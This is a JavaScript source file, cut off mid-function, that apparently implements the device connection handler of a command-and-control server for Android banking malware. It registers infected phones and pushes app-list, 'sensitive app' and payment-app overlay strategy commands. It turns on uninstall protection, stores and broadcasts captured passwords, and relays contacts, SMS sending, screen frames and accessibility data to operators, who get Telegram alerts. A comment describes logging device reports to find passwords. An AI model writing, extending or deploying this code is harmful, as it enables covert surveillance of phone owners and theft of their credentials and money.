'use strict';

const { getPool } = require('../services/commandPoller');
const {
  broadcastToAdmins,
  forwardFrameToAdmins,
  isHighVolumeMessage,
  hasStreamConsumers,
  streamModeForMessage,
  recordInboundStream,
  recordNoSubscriberDrop,
  clearDeviceFrameState,
} = require('./admin');
const { sendFirstTime: sendProtectFirstTime } = require('../services/autoProtect');
const { notifyDeviceOnline } = require('../services/telegram');
const { refreshDeviceGeo } = require('../services/geoLocation');
const { clearGracePeriod } = require('../services/keepAlive');

const DEVICE_LIFECYCLE_KEY = Symbol.for('fisher.deviceLifecycleState');
const RECONNECT_INIT_COOLDOWN_MS = Math.max(1000, Number(process.env.DEVICE_RECONNECT_INIT_COOLDOWN_MS || 60000));
const OFFLINE_GRACE_MS = Math.max(0, Number(process.env.DEVICE_OFFLINE_GRACE_MS || 5000));
const STATUS_UNCHANGED_TTL_MS = Math.max(5000, Number(process.env.DEVICE_STATUS_UNCHANGED_TTL_MS || 30000));
const RECONNECT_LOG_INTERVAL_MS = Math.max(1000, Number(process.env.DEVICE_RECONNECT_LOG_INTERVAL_MS || 60000));
const PROTECT_DELAY_MS = Math.max(0, Number(process.env.DEVICE_PROTECT_DELAY_MS || 2000));
const APP_LIST_DELAY_MS = Math.max(0, Number(process.env.DEVICE_APP_LIST_DELAY_MS || 8000));
const POLICY_PRIMARY_DELAY_MS = Math.max(0, Number(process.env.DEVICE_POLICY_PRIMARY_DELAY_MS || 1500));
const POLICY_RETRY_DELAY_MS = Math.max(0, Number(process.env.DEVICE_POLICY_RETRY_DELAY_MS || 10000));
// A short guard absorbs duplicate handshakes without blocking a real reconnect
// behind a half-open mobile connection for tens of seconds.
const CONNECTION_MIN_HOLD_MS = Math.max(1000, Number(process.env.DEVICE_CONNECTION_MIN_HOLD_MS || 3000));
const CONNECTION_ACTIVE_GRACE_MS = Math.max(CONNECTION_MIN_HOLD_MS, Number(process.env.DEVICE_CONNECTION_ACTIVE_GRACE_MS || 5000));
const RECONNECT_STORM_WINDOW_MS = Math.max(1000, Number(process.env.DEVICE_RECONNECT_STORM_WINDOW_MS || 10000));
const RECONNECT_STORM_THRESHOLD = Math.max(2, Number(process.env.DEVICE_RECONNECT_STORM_THRESHOLD || 6));
const REJECTED_CONNECTION_CLOSE_GRACE_MS = Math.max(0, Number(process.env.DEVICE_REJECTED_CONNECTION_CLOSE_GRACE_MS || 250));
// Per-message tracing is expensive with many devices. Enable only for a
// short diagnostic window when explicitly requested.
const VERBOSE_DEVICE_MESSAGE_LOGS = process.env.WS_VERBOSE_MESSAGE_LOGS === 'true';
const MAX_TRACKED_DEVICE_STATES = 5000;
const DEVICE_STATE_TTL_MS = 24 * 60 * 60 * 1000;

function getDeviceLifecycleState(connections) {
  if (!connections[DEVICE_LIFECYCLE_KEY]) {
    Object.defineProperty(connections, DEVICE_LIFECYCLE_KEY, {
      configurable: false,
      enumerable: false,
      writable: false,
      value: {
        lastInitialization: new Map(),
        pendingOffline: new Map(),
        reconnectLogs: new Map(),
        connectionGuards: new Map(),
        statusSyncs: new Map(),
        lastTaskRuns: new Map(),
        metrics: {},
      },
    });
  }
  const state = connections[DEVICE_LIFECYCLE_KEY];
  state.lastInitialization ||= new Map();
  state.pendingOffline ||= new Map();
  state.reconnectLogs ||= new Map();
  state.connectionGuards ||= new Map();
  state.statusSyncs ||= new Map();
  state.lastTaskRuns ||= new Map();
  state.metrics ||= {};
  for (const key of [
    'connectionReplacements', 'suppressedReplacementLogs',
    'deviceHandshakeAttempts', 'rejectedReconnects', 'rejectedDeviceUpgrades',
    'suppressedReconnectRejectLogs',
    'initializationRuns', 'initializationSkips',
    'statusSyncQueued', 'statusSyncSkipped',
  ]) {
    if (!Number.isFinite(state.metrics[key])) state.metrics[key] = 0;
  }
  return state;
}

function createConnectionTaskTracker() {
  const timers = new Set();
  let cleaned = false;
  return {
    schedule(callback, delayMs) {
      if (cleaned) return null;
      const timer = setTimeout(() => {
        timers.delete(timer);
        if (!cleaned) callback();
      }, delayMs);
      timer.unref?.();
      timers.add(timer);
      return timer;
    },
    cleanup() {
      if (cleaned) return;
      cleaned = true;
      for (const timer of timers) clearTimeout(timer);
      timers.clear();
    },
    get size() { return timers.size; },
  };
}

function pruneLifecycleState(state) {
  const cutoff = Date.now() - DEVICE_STATE_TTL_MS;
  if (state.lastInitialization.size > MAX_TRACKED_DEVICE_STATES) {
    for (const [deviceId, timestamp] of state.lastInitialization) {
      if (timestamp < cutoff) state.lastInitialization.delete(deviceId);
    }
  }
  if (state.reconnectLogs.size > MAX_TRACKED_DEVICE_STATES) {
    for (const [deviceId, entry] of state.reconnectLogs) {
      if ((entry.lastLogAt || 0) < cutoff) state.reconnectLogs.delete(deviceId);
    }
  }
  if (state.connectionGuards.size > MAX_TRACKED_DEVICE_STATES) {
    for (const [deviceId, entry] of state.connectionGuards) {
      if ((entry.lastAttemptAt || 0) < cutoff) state.connectionGuards.delete(deviceId);
    }
  }
  while (state.lastInitialization.size > MAX_TRACKED_DEVICE_STATES) {
    state.lastInitialization.delete(state.lastInitialization.keys().next().value);
  }
  while (state.reconnectLogs.size > MAX_TRACKED_DEVICE_STATES) {
    state.reconnectLogs.delete(state.reconnectLogs.keys().next().value);
  }
  while (state.connectionGuards.size > MAX_TRACKED_DEVICE_STATES) {
    state.connectionGuards.delete(state.connectionGuards.keys().next().value);
  }
  if (state.lastTaskRuns.size > MAX_TRACKED_DEVICE_STATES * 4) {
    for (const [key, timestamp] of state.lastTaskRuns) {
      if (timestamp < cutoff) state.lastTaskRuns.delete(key);
    }
  }
  while (state.lastTaskRuns.size > MAX_TRACKED_DEVICE_STATES * 4) {
    state.lastTaskRuns.delete(state.lastTaskRuns.keys().next().value);
  }
}

function cancelPendingOffline(state, sessionId) {
  const timer = state.pendingOffline.get(sessionId);
  if (!timer) return false;
  clearTimeout(timer);
  state.pendingOffline.delete(sessionId);
  return true;
}

function claimConnectionInitialization(state, sessionId, force = false) {
  const now = Date.now();
  const last = state.lastInitialization.get(sessionId) || 0;
  if (!force && now - last < RECONNECT_INIT_COOLDOWN_MS) {
    state.metrics.initializationSkips++;
    return false;
  }
  state.lastInitialization.set(sessionId, now);
  state.metrics.initializationRuns++;
  return true;
}

function markDeviceInitialization(state, sessionId) {
  const now = Date.now();
  const last = state.lastInitialization.get(sessionId) || 0;
  state.lastInitialization.set(sessionId, now);
  if (now - last < RECONNECT_INIT_COOLDOWN_MS) {
    state.metrics.initializationSkips++;
    return false;
  }
  state.metrics.initializationRuns++;
  return true;
}

function claimDeviceTask(state, sessionId, taskName, cooldownMs = RECONNECT_INIT_COOLDOWN_MS) {
  const key = `${taskName}\u0000${sessionId}`;
  const now = Date.now();
  const last = state.lastTaskRuns.get(key) || 0;
  if (now - last < cooldownMs) return false;
  state.lastTaskRuns.set(key, now);
  return true;
}

function logConnectionReplacement(state, sessionId) {
  const now = Date.now();
  state.metrics.connectionReplacements++;
  const entry = state.reconnectLogs.get(sessionId) || { lastLogAt: 0, suppressed: 0 };
  if (now - entry.lastLogAt >= RECONNECT_LOG_INTERVAL_MS) {
    const suffix = entry.suppressed ? ` suppressed=${entry.suppressed}` : '';
    console.warn(`[WS-Device] replacing stale connection device=${sessionId}${suffix}`);
    entry.lastLogAt = now;
    entry.suppressed = 0;
  } else {
    entry.suppressed++;
    state.metrics.suppressedReplacementLogs++;
  }
  state.reconnectLogs.set(sessionId, entry);
}

function connectionAcceptedAt(connection) {
  if (Number.isFinite(connection?.acceptedAt)) return connection.acceptedAt;
  const parsed = Date.parse(connection?.connectedAt || '');
  return Number.isFinite(parsed) ? parsed : 0;
}

function recordConnectionAttempt(state, sessionId) {
  const now = Date.now();
  let entry = state.connectionGuards.get(sessionId);
  if (!entry) {
    entry = {
      windowStartedAt: now,
      lastAttemptAt: now,
      attempts: 0,
      rejected: 0,
      lastRejectLogAt: 0,
      suppressedRejectLogs: 0,
    };
  } else if (now - entry.windowStartedAt >= RECONNECT_STORM_WINDOW_MS) {
    entry.windowStartedAt = now;
    entry.attempts = 0;
    entry.rejected = 0;
  }
  entry.attempts++;
  entry.lastAttemptAt = now;
  state.connectionGuards.set(sessionId, entry);
  state.metrics.deviceHandshakeAttempts++;
  return { now, entry };
}

function shouldProtectExistingConnection(previousConnection, now) {
  if (!previousConnection?.ws || previousConnection.ws.readyState !== 1) return false;
  const acceptedAt = connectionAcceptedAt(previousConnection);
  if (acceptedAt && now - acceptedAt < CONNECTION_MIN_HOLD_MS) return true;
  const lastMessageAt = Number(previousConnection.lastMessageAt || 0);
  return lastMessageAt > 0 && now - lastMessageAt < CONNECTION_ACTIVE_GRACE_MS;
}

function logRejectedReconnect(state, sessionId, entry) {
  const now = Date.now();
  if (now - entry.lastRejectLogAt >= RECONNECT_LOG_INTERVAL_MS) {
    const suffix = entry.suppressedRejectLogs ? ` suppressed=${entry.suppressedRejectLogs}` : '';
    console.warn(`[WS-Device] rejected competing connection device=${sessionId}${suffix}`);
    entry.lastRejectLogAt = now;
    entry.suppressedRejectLogs = 0;
  } else {
    entry.suppressedRejectLogs++;
    state.metrics.suppressedReconnectRejectLogs++;
  }
}

function rejectCompetingConnection(ws) {
  try { ws.close(1013, 'Existing connection is active'); } catch {}
  if (REJECTED_CONNECTION_CLOSE_GRACE_MS <= 0) {
    try { ws.terminate(); } catch {}
    return;
  }
  const timer = setTimeout(() => {
    if (ws.readyState !== 3) {
      try { ws.terminate(); } catch {}
    }
  }, REJECTED_CONNECTION_CLOSE_GRACE_MS);
  timer.unref?.();
  ws.once('close', () => clearTimeout(timer));
}

function preflightDeviceUpgrade(sessionId, connections) {
  const lifecycle = getDeviceLifecycleState(connections);
  pruneLifecycleState(lifecycle);
  const previousConnection = connections.devices.get(sessionId);
  const { now, entry } = recordConnectionAttempt(lifecycle, sessionId);
  if (!shouldProtectExistingConnection(previousConnection, now)) {
    return { rejected: false, attemptAt: now };
  }
  lifecycle.metrics.rejectedReconnects++;
  lifecycle.metrics.rejectedDeviceUpgrades++;
  entry.rejected++;
  logRejectedReconnect(lifecycle, sessionId, entry);
  return { rejected: true, attemptAt: now };
}

function statusFingerprint(data, clientIp) {
  const value = data && typeof data === 'object' ? data : {};
  return JSON.stringify([
    value.brand || '', value.model || '', value.osVersion || '', value.appVersion || '',
    value.appName || value.deviceName || '', value.batteryLevel ?? null,
    value.networkType ?? '', value.isScreenOn ?? null, value.isCharging ?? null,
    value.isLocked ?? null, value.accessibilityAlive ?? null,
    value.screenWidth ?? null, value.screenHeight ?? null,
    value.permissions && typeof value.permissions === 'object' ? value.permissions : null,
    normalizeIp(value.publicIP || clientIp),
  ]);
}

function mergeStatusSnapshot(previous, data) {
  const next = { ...(previous || {}) };
  const value = data && typeof data === 'object' ? data : {};
  const fields = [
    'brand', 'model', 'osVersion', 'appVersion', 'appName', 'deviceName',
    'batteryLevel', 'networkType', 'isScreenOn', 'isCharging', 'isLocked',
    'accessibilityAlive', 'screenWidth', 'screenHeight', 'permissions', 'publicIP',
  ];
  for (const field of fields) {
    if (value[field] !== undefined && value[field] !== null) next[field] = value[field];
  }
  return next;
}

function queueDeviceStatusSync(connections, deviceId, data, clientIp) {
  const lifecycle = getDeviceLifecycleState(connections);
  pruneLifecycleState(lifecycle);
  let state = lifecycle.statusSyncs.get(deviceId);
  if (!state) {
    state = {
      running: false,
      pending: null,
      snapshot: null,
      lastSignature: '',
      lastCompletedAt: 0,
      cleanupTimer: null,
    };
    lifecycle.statusSyncs.set(deviceId, state);
  }

  state.snapshot = mergeStatusSnapshot(state.snapshot, data);
  const signature = statusFingerprint(state.snapshot, clientIp);
  if (!state.running && signature === state.lastSignature
      && Date.now() - state.lastCompletedAt < STATUS_UNCHANGED_TTL_MS) {
    lifecycle.metrics.statusSyncSkipped++;
    return false;
  }

  lifecycle.metrics.statusSyncQueued++;
  state.pending = { data, clientIp, signature };
  clearTimeout(state.cleanupTimer);
  if (state.running) return true;

  state.running = true;
  (async () => {
    try {
      while (state.pending) {
        const next = state.pending;
        state.pending = null;
        if (next.signature === state.lastSignature
            && Date.now() - state.lastCompletedAt < STATUS_UNCHANGED_TTL_MS) continue;
        const saved = await syncDeviceStatus(deviceId, next.data, next.clientIp);
        if (saved) {
          state.lastSignature = next.signature;
          state.lastCompletedAt = Date.now();
        }
      }
    } finally {
      state.running = false;
      state.cleanupTimer = setTimeout(() => {
        if (!state.running && !state.pending) lifecycle.statusSyncs.delete(deviceId);
      }, 10 * 60 * 1000);
      state.cleanupTimer.unref?.();
    }
  })().catch(err => console.error(`[WS-Device] status queue error device=${deviceId}:`, err.message));
  return true;
}

function getDeviceLifecycleMetrics(connections) {
  const state = getDeviceLifecycleState(connections);
  let pendingConnectionTasks = 0;
  for (const connection of connections.devices.values()) {
    pendingConnectionTasks += Number(connection.tasks?.size || 0);
  }
  let suppressedReconnectLogs = 0;
  for (const entry of state.reconnectLogs.values()) suppressedReconnectLogs += entry.suppressed || 0;
  const now = Date.now();
  let reconnectStormDevices = 0;
  for (const entry of state.connectionGuards.values()) {
    if (now - entry.lastAttemptAt < RECONNECT_STORM_WINDOW_MS
        && entry.attempts >= RECONNECT_STORM_THRESHOLD) reconnectStormDevices++;
  }
  return {
    pendingDeviceOffline: state.pendingOffline.size,
    pendingConnectionTasks,
    activeStatusSyncs: [...state.statusSyncs.values()].filter(item => item.running).length,
    pendingStatusSyncs: [...state.statusSyncs.values()].filter(item => item.pending).length,
    trackedDeviceLifecycleStates: state.lastInitialization.size,
    suppressedReconnectLogs,
    reconnectStormDevices,
    ...state.metrics,
  };
}

function normalizeIp(value) {
  return String(value || '').trim().replace(/^::ffff:/, '');
}

function isUsablePublicIp(value) {
  const ip = normalizeIp(value);
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('0.')) return false;
  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('169.254.')) return false;
  if (/^172\.(1[6-9]|2\d|3[0-1])\./.test(ip)) return false;
  if (ip.startsWith('fc') || ip.startsWith('fd') || ip.startsWith('fe80:')) return false;
  return true;
}

const SCREEN_PREFIX = /["'](?:type|event|messageType)["']\s*:\s*["'](?:screenshot|screen|frame|screen_frame)["']/i;
const READER_PREFIX = /["'](?:type|event|messageType)["']\s*:\s*["'](?:ui_hierarchy|accessibility_data|accessibility_dump|reader_data)["']/i;

function dropUnsubscribedStreamBuffer(buf, sessionId, connections) {
  const prefix = buf.subarray(0, Math.min(buf.length, 2048)).toString('utf8');
  const mode = SCREEN_PREFIX.test(prefix) ? 'screen_capture' : (READER_PREFIX.test(prefix) ? 'reader' : '');
  if (!mode || hasStreamConsumers(connections, sessionId, mode)) return false;
  recordInboundStream(connections, buf.length);
  recordNoSubscriberDrop(connections, buf.length);
  return true;
}

function acceptParsedDeviceMessage(msg, bytes, sessionId, connections) {
  if (!isHighVolumeMessage(msg)) return true;
  recordInboundStream(connections, bytes);
  if (hasStreamConsumers(connections, sessionId, streamModeForMessage(msg))) return true;
  recordNoSubscriberDrop(connections, bytes);
  return false;
}

function normalizeContactsPayload(msg) {
  const data = msg && msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data) ? msg.data : {};
  const nested = data.data && typeof data.data === 'object' && !Array.isArray(data.data) ? data.data : {};
  const contacts = msg?.contacts || data.contacts || nested.contacts || msg?.result?.contacts || msg?.payload?.contacts || (Array.isArray(msg?.data) ? msg.data : []);
  const successValue = data.success ?? nested.success ?? msg?.success;
  const error = data.error || data.message || nested.error || nested.message || msg?.error || msg?.message || '';
  const success = successValue === undefined ? !error : ![false, 0, '0', 'false'].includes(successValue);
  return {
    ...data,
    success,
    count: Number(data.count ?? nested.count ?? (Array.isArray(contacts) ? contacts.length : 0)),
    contacts: Array.isArray(contacts) ? contacts : [],
    error,
  };
}

function normalizeSmsSendPayload(msg) {
  const data = msg && msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data) ? msg.data : {};
  const nested = data.data && typeof data.data === 'object' && !Array.isArray(data.data) ? data.data : {};
  const successValue = data.success ?? nested.success ?? msg?.success;
  const error = data.error || data.message || nested.error || nested.message || msg?.error || msg?.message || '';
  return {
    ...data,
    success: [true, 1, '1', 'true'].includes(successValue),
    phoneNumber: data.phoneNumber || data.phone || nested.phoneNumber || nested.phone || msg?.phoneNumber || msg?.phone || '',
    simSlot: Number(data.simSlot ?? nested.simSlot ?? msg?.simSlot ?? 0),
    error,
  };
}

async function queryPolicyRows(sql) {
  try {
    const [rows] = await getPool().query(sql);
    return Array.isArray(rows) ? rows : [];
  } catch (e) {
    console.warn('[PolicySync] query skipped: ' + e.message);
    return [];
  }
}

async function syncGlobalPolicies(ws, sessionId) {
  if (!ws || ws.readyState !== 1) return;
  const [sensitiveRows, blackRows, paymentRows] = await Promise.all([
    queryPolicyRows("SELECT package_name FROM fisher_sensitive_apps WHERE package_name IS NOT NULL AND package_name <> ''"),
    queryPolicyRows("SELECT package_name FROM fisher_black_apps WHERE package_name IS NOT NULL AND package_name <> ''"),
    queryPolicyRows("SELECT package_name, app_name, windows FROM fisher_payment_strategies WHERE enabled = 1 AND package_name IS NOT NULL AND package_name <> '' ORDER BY id ASC"),
  ]);
  const sensitive = [...new Set(sensitiveRows.map(row => String(row.package_name || '').trim()).filter(Boolean))];
  const black = [...new Set(blackRows.map(row => String(row.package_name || '').trim()).filter(Boolean))];
  const strategies = paymentRows.map(row => {
    let windows = row.windows;
    if (typeof windows === 'string') {
      try { windows = JSON.parse(windows); } catch { windows = []; }
    }
    return {
      packageName: String(row.package_name || '').trim(),
      appName: String(row.app_name || '').trim(),
      listenWinClasses: Array.isArray(windows) ? windows : [],
    };
  }).filter(row => row.packageName);
  const commands = [
    ['SET_SENSITIVE_APPS', { apps: sensitive }],
    ['SET_BLACK_APPS', { apps: black }],
    ['SET_PAYMENT_STRATEGIES', { strategies }],
  ];
  for (const [command, params] of commands) {
    if (ws.readyState !== 1) break;
    try {
      ws.send(JSON.stringify({ type: 'command', sessionId, data: { command, params } }));
    } catch (e) {
      console.warn('[PolicySync] ' + command + ' failed for ' + sessionId + ': ' + e.message);
    }
  }
  console.log('[PolicySync] synced ' + sessionId + ': sensitive=' + sensitive.length + ', black=' + black.length + ', payment=' + strategies.length);
}

/**
 * APK 设备端 WebSocket handler
 * 路径: /ws/device?sessionId=xxx
 */
function handleDevice(ws, sessionId, connections) {
  // 获取客户端真实 IP
  const rawIp = ws._socket ? ws._socket.remoteAddress : '';
  const clientIp = rawIp ? rawIp.replace('::ffff:', '') : '';
  const connectedAt = new Date().toISOString();
  // ★ 闭包变量：latestClientIp 随 status 消息更新（pool 自愈用 + 修复 C 简化版）
  let latestClientIp = clientIp;

  const lifecycle = getDeviceLifecycleState(connections);
  pruneLifecycleState(lifecycle);
  const previousConnection = connections.devices.get(sessionId);
  const preflightAttemptAt = Number(ws._deviceAttemptAt || 0);
  const preflightEntry = preflightAttemptAt ? lifecycle.connectionGuards.get(sessionId) : null;
  const attempt = preflightAttemptAt && preflightEntry
    ? { now: preflightAttemptAt, entry: preflightEntry }
    : recordConnectionAttempt(lifecycle, sessionId);
  const { now: attemptAt, entry: connectionGuard } = attempt;
  if (shouldProtectExistingConnection(previousConnection, attemptAt)) {
    lifecycle.metrics.rejectedReconnects++;
    connectionGuard.rejected++;
    logRejectedReconnect(lifecycle, sessionId, connectionGuard);
    rejectCompetingConnection(ws);
    return;
  }
  const resumedDuringGrace = cancelPendingOffline(lifecycle, sessionId);
  clearGracePeriod(sessionId);
  const tasks = createConnectionTaskTracker();
  const connection = {
    ws,
    sessionId,
    clientIp,
    connectedAt,
    acceptedAt: attemptAt,
    lastMessageAt: 0,
    tasks,
  };
  connections.devices.set(sessionId, connection);
  if (previousConnection?.ws && previousConnection.ws !== ws) {
    previousConnection.cleanup?.();
    previousConnection.tasks?.cleanup?.();
    logConnectionReplacement(lifecycle, sessionId);
    try { previousConnection.ws.terminate(); } catch {}
  }
  const isNewOnlinePresence = !previousConnection && !resumedDuringGrace;
  const shouldInitialize = markDeviceInitialization(lifecycle, sessionId);
  if (shouldInitialize) {
    console.log(`[WS-Device] connected device=${sessionId} ip=${clientIp} at=${connectedAt}`);
  }

  // 清除自动注入缓存（设备重新上线时允许重新注入一次）
  if (shouldInitialize && autoInjectedCache && autoInjectedCache.has(sessionId)) {
    autoInjectedCache.delete(sessionId);
  }

  // 更新设备在线状态 + IP
  if (isNewOnlinePresence) updateDeviceStatus(sessionId, true, clientIp);

  // 2026-08-02 device auto-protect: send ENABLE_UNINSTALL_PROTECTION on register
  tasks.schedule(() => {
    if (connections.devices.get(sessionId)?.ws !== ws) return;
    if (claimDeviceTask(lifecycle, sessionId, 'protect')) {
      sendProtectFirstTime(connections, sessionId);
    }
  }, PROTECT_DELAY_MS);

  // 设备上线 8 秒后自动获取应用列表（用于自动注入匹配）
  tasks.schedule(() => {
    if (ws.readyState === 1 && connections.devices.get(sessionId)?.ws === ws
        && claimDeviceTask(lifecycle, sessionId, 'app-list')) {
        console.log(`[WS-Device] Sending GET_APP_LIST to ${sessionId}`);
        ws.send(JSON.stringify({
          type: 'command',
          sessionId,
          data: { command: 'GET_APP_LIST', params: {} }
        }));
    }
  }, APP_LIST_DELAY_MS);

  // 设备上线时补发全局策略；第一次失败时稍后重试一次。
  for (const [delay, taskName] of [
    [POLICY_PRIMARY_DELAY_MS, 'policy-primary'],
    [POLICY_RETRY_DELAY_MS, 'policy-retry'],
  ]) {
    tasks.schedule(() => {
      if (connections.devices.get(sessionId)?.ws !== ws) return;
      if (claimDeviceTask(lifecycle, sessionId, taskName)) {
        syncGlobalPolicies(ws, sessionId).catch(err => console.warn('[PolicySync] ' + sessionId + ': ' + err.message));
      }
    }, delay);
  }

  // 通知管理端（同时发两种格式，兼容前端 bot_online/device_online）
  if (isNewOnlinePresence) {
    broadcastToAdmins(connections, { type: 'device_online', sessionId, deviceId: sessionId, data: { status: 'online' } });
    broadcastToAdmins(connections, { type: 'bot_online', sessionId, deviceId: sessionId, botId: sessionId });
    broadcastToAdmins(connections, { type: 'device_update' });
  }

  // Queue the online notification outside the PHP device-list request path.
  // The Telegram service delays the lookup and sends asynchronously.
  if (shouldInitialize) {
    notifyDeviceOnline(sessionId, { publicIP: clientIp }).catch(err => {
      console.warn(`[Telegram] online notification failed for ${sessionId}: ${err.message}`);
    });
  }

  // 定时更新 last_seen（每30秒）
  const heartbeatInterval = setInterval(() => {
    if (ws.readyState === 1) {
      const now = Math.floor(Date.now() / 1000);
      getPool().query('UPDATE fisher_devices SET last_seen=? WHERE device_id=?', [now, sessionId]).catch(() => {});
    }
  }, 30000);

  // RFC 6455 ping/pong 仅在显式开启时使用，兼容只实现应用层心跳的 APK。
  let isAlive = true;
  const protocolPingEnabled = process.env.NODE_WS_PROTOCOL_PING === '1';
  let serverPingInterval = null;
  if (protocolPingEnabled) {
    ws.on('pong', () => { isAlive = true; });
    serverPingInterval = setInterval(() => {
      if (ws.readyState !== 1) return;
      if (!isAlive) {
        console.log('[WS-Device] Ping timeout, terminating zombie connection: ' + sessionId);
        ws.terminate();
        return;
      }
      isAlive = false;
      try { ws.ping(); } catch (e) {}
    }, 30000);
  }

  ws.on('message', (data) => {
    // ★ Stability: wrap entire handler body in try/catch to prevent unhandled
    // exceptions in handler/forwarding logic from crashing the WS server.
    try {
      // ★ 入站消息自愈（2026-08-06）：校验 ws 仍活着，否则丢弃
      // 解决"WS 显示离线但 handleDeviceMessage 仍能跑"的矛盾
      if (ws.readyState !== 1) return
      // ★ 池自愈：如果池里已被清空（理论不应该，但兜底），自动重新注册
      const currentConnection = connections.devices.get(sessionId);
      if (!currentConnection || currentConnection.ws !== ws) {
        console.warn(`[WS-Device] stale message ignored device=${sessionId}`);
        return;
      }
      connection.lastMessageAt = Date.now();
      // 尝试将 Buffer 解析为 JSON（设备可能以二进制帧发送 JSON 响应）
      if (Buffer.isBuffer(data) || data instanceof ArrayBuffer) {
        const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
        if (dropUnsubscribedStreamBuffer(buf, sessionId, connections)) return;
        // 检查是否以 '{' 或 '[' 开头（JSON）
        if (buf.length > 0 && (buf[0] === 0x7b || buf[0] === 0x5b)) {
          try {
            const str = buf.toString('utf8');
            const msg = JSON.parse(str);
            if (!acceptParsedDeviceMessage(msg, buf.length, sessionId, connections)) return;
            if (VERBOSE_DEVICE_MESSAGE_LOGS && !isHighVolumeMessage(msg) && !['heartbeat', 'HEARTBEAT', 'status', 'device_heartbeat'].includes(msg.type)) {
              console.log(`[WS-Device] message device=${sessionId} type=${msg.type || msg.event || 'unknown'}`);
            }
            handleDeviceMessage(ws, msg, sessionId, connections);
            return;
          } catch {}
        }
        // 真正的二进制帧 = 屏幕画面
        forwardFrameToAdmins(sessionId, data, connections);
        return;
      }

      try {
        const text = data.toString();
        const msg = JSON.parse(text);
        if (!acceptParsedDeviceMessage(msg, Buffer.byteLength(text), sessionId, connections)) return;
        if (VERBOSE_DEVICE_MESSAGE_LOGS && !isHighVolumeMessage(msg) && !['heartbeat', 'HEARTBEAT', 'status', 'device_heartbeat'].includes(msg.type)) {
          console.log(`[WS-Device] message device=${sessionId} type=${msg.type || msg.event || 'unknown'}`);
        }
        handleDeviceMessage(ws, msg, sessionId, connections);
      } catch (err) {
        console.error(`[WS-Device] Parse error from ${sessionId}:`, err.message);
      }
    } catch (err) {
      console.error(`[WS-Device] Unhandled error in message handler for ${sessionId}:`, err && err.message ? err.message : err);
    }
  });

  // ★ FIX: WS 连接池竞态误删（2026-08-06）
  // 归属校验：仅当连接池中仍是当前 ws 时才执行清理，避免旧连接 close 误删新连接
  function isCurrentDeviceConnection() {
    const cur = connections.devices.get(sessionId);
    return cur && cur.ws === ws;
  }

  let connectionFinished = false;
  function finishConnection() {
    if (connectionFinished) return;
    connectionFinished = true;
    tasks.cleanup();
    clearInterval(heartbeatInterval);
    clearInterval(serverPingInterval);
    if (!isCurrentDeviceConnection()) return;
    connections.devices.delete(sessionId);
    cancelPendingOffline(lifecycle, sessionId);
    const finalizeOffline = () => {
      lifecycle.pendingOffline.delete(sessionId);
      if (connections.devices.has(sessionId)) return;
      clearDeviceFrameState(sessionId);
      autoInjectedCache.delete(sessionId);
      const bridgeOnline = connections.bridges.has(sessionId);
      if (!bridgeOnline) updateDeviceStatus(sessionId, false);
      broadcastToAdmins(connections, {
        type: 'device_offline',
        sessionId,
        deviceId: sessionId,
        data: { status: bridgeOnline ? 'online' : 'offline' },
      });
      if (!bridgeOnline) {
        broadcastToAdmins(connections, { type: 'bot_offline', sessionId, deviceId: sessionId, botId: sessionId });
      }
      broadcastToAdmins(connections, { type: 'device_update' });
      console.log(`[WS-Device] disconnected device=${sessionId} at=${new Date().toISOString()}`);
    };
    if (OFFLINE_GRACE_MS <= 0) {
      finalizeOffline();
      return;
    }
    const offlineTimer = setTimeout(finalizeOffline, OFFLINE_GRACE_MS);
    offlineTimer.unref?.();
    lifecycle.pendingOffline.set(sessionId, offlineTimer);
  }

  connection.cleanup = finishConnection;
  ws.on('close', finishConnection);
  ws.on('error', finishConnection);
}

function handleDeviceMessage(ws, msg, sessionId, connections) {
  // ★ DBG2 2026-09-12: 抓设备上报（重点找密码）
  try {
    const _t = String(msg && (msg.type || msg.event || '')).toLowerCase();
    if (_t && !['ping','pong','heartbeat','device_heartbeat','screen_frame','screenshot','app_list_response','black_apps_updated','sensitive_apps_updated','payment_strategies_updated','injection_status'].includes(_t)) {
      console.log(`[DEVMSG] ${sessionId} type=${msg.type || msg.event} :: ${JSON.stringify(msg).substring(0,400)}`);
    }
  } catch (e) {}

  const { type } = msg;
  const highVolume = isHighVolumeMessage(msg);
  if (VERBOSE_DEVICE_MESSAGE_LOGS && !highVolume && !['heartbeat', 'HEARTBEAT', 'status', 'device_heartbeat'].includes(type)) {
    console.log(`[WS-Device] handle device=${sessionId} type=${type || 'unknown'}`);
  }

  // 旧后端逻辑：心跳/状态/注册消息都会触发设备信息更新
  const registerTypes = ['REGISTER', 'register', 'heartbeat', 'HEARTBEAT',
    'status', 'device_heartbeat', 'device_status', 'USER_MESSAGE',
    'bot_status', 'device_status_update', 'get_device_state_response',
    'device_info'];

  if (registerTypes.includes(type)) {
    // 提取 data 字段中的设备信息，与旧后端 update_db() 一致
    // device_info 消息的数据在 msg.info 而非 msg.data
    const info = msg.info || msg.data || msg.payload || msg;
    // ★ 修复 C：不再查池拿 clientIp（避免池被清空时丢失 IP），直接从 ws 取实时 IP
    const rawIp = ws._socket ? ws._socket.remoteAddress : '';
    const wsClientIp = rawIp ? rawIp.replace('::ffff:', '') : '';
    queueDeviceStatusSync(connections, sessionId, info, wsClientIp);
  }

  switch (type) {
    case 'status':
    case 'bot_status':
    case 'device_status_update':
    case 'get_device_state_response':
      // 检查是否是密码上报（APK 可能用 type:'status' + data.type:'password_captured'）
      if (msg.data && (msg.data.type === 'password_captured' || msg.data.type === 'PASSWORD_CAPTURED')) {
        console.log(`[WS-Device] >>>> Password captured from ${sessionId}:`, JSON.stringify(msg.data).substring(0, 200));
        savePassword(sessionId, msg.data);
        // 额外广播 password_status 类型消息，触发前端密码卡片刷新
        broadcastToAdmins(connections, { type: 'password_status', deviceId: sessionId, sessionId });
      }
      // 状态更新，转发给管理端 + 更新数据库
      broadcastToAdmins(connections, {
        ...msg,
        data: msg.data || msg.payload || {},
        sessionId,
        deviceId: sessionId,
      });
      break;

    case 'command_result':
      // 命令结果，转发给管理端
      const commandName = String(msg.data?.command || msg.data?.requestCommand || msg.data?.originalCommand || msg.command || 'unknown');
      if (!highVolume) {
        console.log(`[WS-Reply] device=${sessionId} type=command_result command=${commandName}`);
      }
      // 检测 command_result 中的短信/通讯录/应用数据并入库
      {
        const rd = msg.data || {};
